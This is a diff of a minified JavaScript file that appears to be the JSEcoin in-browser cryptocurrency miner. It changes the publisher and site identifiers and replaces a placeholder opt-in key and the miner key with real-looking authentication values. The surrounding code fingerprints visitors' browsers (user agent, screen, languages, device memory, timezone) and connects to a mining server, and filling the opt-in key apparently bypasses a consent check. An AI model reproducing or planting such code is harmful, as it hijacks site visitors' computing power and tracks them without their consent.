@@ -168,7 +168,7 @@ var JSE = function() {
         jseTrack = {},
         ts = (new Date).getTime(),
         jseLoadServer = "https://load.jsecoin.com:443";
-    "local" == jseTestNet && (jseLoadServer = "http://localhost:81"), "remote" == jseTestNet && (jseLoadServer = "https://testnet.jsecoin.com:443"), jseTrack.pubID = "59684", jseTrack.siteID = "nonkesheavean.web.fc2.com", jseTrack.subID = "optionalSubID", jseTrack.userIP = "unknownuserip", jseTrack.geo = "unknowngeo", jseTrack.url = window.location.href, jseTrack.userAgent = navigator.userAgent || 0, jseTrack.platform = navigator.platform || 0, jseTrack.referrer = document.referrer || 0, jseTrack.language = window.navigator.language || 0, navigator.languages ? jseTrack.languages = navigator.languages.join("") || 0 : jseTrack.languages = 1, jseTrack.timezoneOffset = (new Date).getTimezoneOffset() || 0, jseTrack.appName = window.navigator.appName || 0, jseTrack.screen = window.screen.width + "x" + window.screen.height + "x" + screen.colorDepth || 0, jseTrack.deviceMemory = navigator.deviceMemory || navigator.hardwareConcurrency || 0, jseTrack.protoString = Object.keys(navigator.__proto__).join("").substring(0, 100) || 0, null == window.frameElement ? jseTrack.iFrame = !1 : jseTrack.iFrame = !0;
+    "local" == jseTestNet && (jseLoadServer = "http://localhost:81"), "remote" == jseTestNet && (jseLoadServer = "https://testnet.jsecoin.com:443"), jseTrack.pubID = "56758", jseTrack.siteID = "dagon", jseTrack.subID = "mimiyoshihara", jseTrack.userIP = "unknownuserip", jseTrack.geo = "unknowngeo", jseTrack.url = window.location.href, jseTrack.userAgent = navigator.userAgent || 0, jseTrack.platform = navigator.platform || 0, jseTrack.referrer = document.referrer || 0, jseTrack.language = window.navigator.language || 0, navigator.languages ? jseTrack.languages = navigator.languages.join("") || 0 : jseTrack.languages = 1, jseTrack.timezoneOffset = (new Date).getTimezoneOffset() || 0, jseTrack.appName = window.navigator.appName || 0, jseTrack.screen = window.screen.width + "x" + window.screen.height + "x" + screen.colorDepth || 0, jseTrack.deviceMemory = navigator.deviceMemory || navigator.hardwareConcurrency || 0, jseTrack.protoString = Object.keys(navigator.__proto__).join("").substring(0, 100) || 0, null == window.frameElement ? jseTrack.iFrame = !1 : jseTrack.iFrame = !0;
     var preHash = "0",
         hashRate = 500,
         hps = 500,
@@ -377,8 +377,8 @@ var JSE = function() {
             console.log("Loaded " + socketIOAddress), ioLoaded = !0
         })
     }();
-    var optInAuthKey = "unknownOptInAuthKey",
-        minerAuthKey = "882fbaaea7917e030e5e30f4117daab521975dcf2b5c87f98ebb95f4b40d42a0";
+    var optInAuthKey = "7bfe32310d82b79bddadc8519dc8e5e538ac6346a8f351125e10b8c859175f44",
+        minerAuthKey = "7c0e40c76f2f8741b5c00c3b4c3a22a47d7ad7493b605f83d38912206f07c11b";
     void 0 === jseTrackImpression.sendHit && (console.log("Connecting to IO and logging unique"), checkIOLoaded(function() {
         sockets[0].emit("saveUnique", jseTrackImpression)
     })), optInAuthKey == "unknown".toLowerCase() + "OptInAuthKey" ? function() {
